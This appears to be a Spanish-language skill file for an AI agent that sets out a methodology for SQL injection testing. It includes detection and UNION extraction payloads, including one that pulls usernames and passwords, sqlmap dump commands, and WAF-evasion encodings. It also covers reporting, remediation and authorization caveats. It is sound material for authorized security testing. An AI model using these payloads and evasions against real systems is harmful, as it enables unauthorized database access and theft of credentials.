---
name: sql-injection-testing
description: Habilidades profesionales y metodología para pruebas de inyección SQL
version: 1.0.0
---

# Habilidades de pruebas de inyección SQL

## Descripción general

La inyección SQL es una vulnerabilidad de aplicaciones web común y peligrosa. Esta habilidad proporciona métodos de prueba sistemáticos, técnicas de detección y estrategias de explotación para inyección SQL.

## Métodos de prueba

### 1. Identificación de parámetros
- Identificar todos los puntos de entrada del usuario: parámetros de URL, datos POST, cabeceras HTTP, cookies, etc.
- Prestar especial atención a los parámetros: id, search, filter, sort, etc.
- Usar Burp Suite o una herramienta similar para interceptar y modificar solicitudes

### 2. Detección básica
- Prueba de comilla simple: `'` - comprobar si aparece un error de SQL
- Inyección ciega basada en booleanos: `' AND '1'='1` vs `' AND '1'='2`
- Inyección ciega basada en tiempo: `' AND SLEEP(5)--`
- Consulta de unión: `' UNION SELECT NULL--`

### 3. Identificación de base de datos
- MySQL: `' AND @@version LIKE '%mysql%'--`
- PostgreSQL: `' AND version() LIKE '%PostgreSQL%'--`
- MSSQL: `' AND @@version LIKE '%Microsoft%'--`
- Oracle: `' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--`

### 4. Extracción de información
- Nombre de la base de datos: `' UNION SELECT database()--`
- Nombres de tablas: `' UNION SELECT table_name FROM information_schema.tables--`
- Nombres de columnas: `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
- Extracción de datos: `' UNION SELECT username,password FROM users--`

## Uso de herramientas

### sqlmap
```bash
# Escaneo básico
sqlmap -u "http://target.com/page?id=1"

# Especificar parámetros
sqlmap -u "http://target.com/page" --data="id=1" --method=POST

# Especificar tipo de base de datos
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# Obtener lista de bases de datos
sqlmap -u "http://target.com/page?id=1" --dbs

# Obtener tablas
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Obtener datos
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
```

### Pruebas manuales
- Usar el módulo Repeater de Burp Suite
- Usar las herramientas de desarrollador del navegador
- Escribir scripts en Python para pruebas automatizadas

## Técnicas de evasión

### Evasión de WAF
- Evasión por codificación: codificación URL, codificación Unicode, codificación hexadecimal
- Evasión por comentarios: `/**/`, `--`, `#`
- Mezcla de mayúsculas y minúsculas: `SeLeCt`, `UnIoN`
- Reemplazo de espacios: `/**/`, `+`, `%09`(Tab), `%0A`(salto de línea)

### Ejemplos
```
Original: ' UNION SELECT NULL--
Evasión 1: '/**/UNION/**/SELECT/**/NULL--
Evasión 2: '%55nion%20select%20null--
Evasión 3: '/*!UNION*//*!SELECT*/null--
```

## Validación y reporte

### Pasos de validación
1. Confirmar que se pueden ejecutar sentencias SQL
2. Extraer información de la base de datos para validación
3. Evaluar el alcance del impacto (fuga de datos, escalada de privilegios, etc.)
4. Registrar la prueba de concepto (POC) completa (solicitud/respuesta)

### Puntos clave del reporte
- Ubicación de la vulnerabilidad y parámetros
- Datos y sistemas afectados
- Pasos completos de explotación
- Sugerencias de remediación (consultas parametrizadas, validación de entrada, etc.)

## Consideraciones

- Realizar solo en entornos de pruebas de seguridad autorizados
- Evitar causar daños a los datos de producción
- Usar con precaución operaciones peligrosas como DROP, DELETE, etc.
- Registrar todos los pasos de prueba para facilitar la reproducción
